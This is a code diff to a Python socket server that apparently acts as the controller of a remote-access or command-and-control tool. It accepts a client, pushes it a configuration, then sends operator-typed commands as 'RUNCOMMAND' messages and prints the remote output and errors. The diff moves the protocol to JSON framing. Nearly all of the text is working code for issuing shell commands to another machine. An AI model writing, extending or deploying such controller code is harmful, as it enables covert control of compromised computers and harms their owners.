@@ -15,6 +15,24 @@ def get_client_configuration(id: str) -> dict:
     }
 
 
+def send_message(socket: socket.socket, type: str, payload: dict):
+    data = {
+        "action": type,
+        "payload": payload
+    }
+
+    message = json.dumps(data)
+    print("Sending %s" % message)
+    socket.send(message.encode())
+
+
+def receive_message(socket: socket.socket) -> dict:
+    message = socket.recv(4096)
+    decoded_message = message.decode()
+    print("Received %s" % decoded_message)
+    return json.loads(decoded_message)
+
+
 server = socket.socket()
 server.bind((HOST, PORT))
 
@@ -26,28 +44,19 @@ client, client_addr = server.accept()
 
 print(f'[+] {client_addr} Client connected to the server')
 
-message = client.recv(1024)
-message = message.decode()
-
+message = receive_message(client)
 print('[+] Message received: "%s"' % message)
-
-client_id = message.split(" ")[1]
+client_id = message["payload"]["id"]
 
 print('[+] Sending config to "%s"' % client_id)
 
-message = ('SET_CONFIG %s' % json.dumps(
-    get_client_configuration(client_id))).encode()
-client.send(message)
+send_message(client, "SET_CONFIG", get_client_configuration(client_id))
 
 while True:
     command = input("Enter command: ")
-    command = command.encode()
-
-    client.send(command)
-
+    send_message(client, "RUNCOMMAND", {"command": command})
     print('[+] Command sent')
 
-    output = client.recv(1024)
-    output = output.decode()
-
-    print(f'Output: {output}')
+    message = receive_message(client)
+    print(f'Output:\n{message["payload"]["output"]}')
+    print(f'Output error:\n{message["payload"]["output_error"]}')
